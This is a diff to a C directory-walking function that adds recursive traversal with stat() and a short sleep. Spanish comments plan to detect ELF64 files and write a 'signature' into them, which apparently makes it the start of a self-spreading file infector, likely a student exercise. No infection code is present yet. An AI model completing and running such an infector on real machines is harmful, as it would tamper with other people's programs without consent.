@@ -52,8 +52,8 @@ void check_dir(char *path)
 
     while ((entry = readdir(dir)) != NULL)
     {
-        if (entry->d_name == "." || entry->d_name == "..")
-            continue ;
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
         char *path_and_name = ft_strjoin(path, entry->d_name);
         if (!path_and_name)
         {
@@ -62,7 +62,28 @@ void check_dir(char *path)
             return;
         }
 
+
         printf("RUTA COMPLETA DEL FILE: |%s|\n", path_and_name);
+
+        struct stat statbuf;
+        if (stat(path_and_name, &statbuf) == -1)
+        {
+            perror("stat");
+            free(path_and_name);
+            continue;
+        }
+
+
+        if (S_ISDIR(statbuf.st_mode))
+        {
+            sleep(3);
+            check_dir(path_and_name);
+        }
+
+        //hacer if que compruebe si es ELF64 el file
+
+        //en caso de serlo meterle la firma 
+
         free(path_and_name);
     }
     closedir(dir);
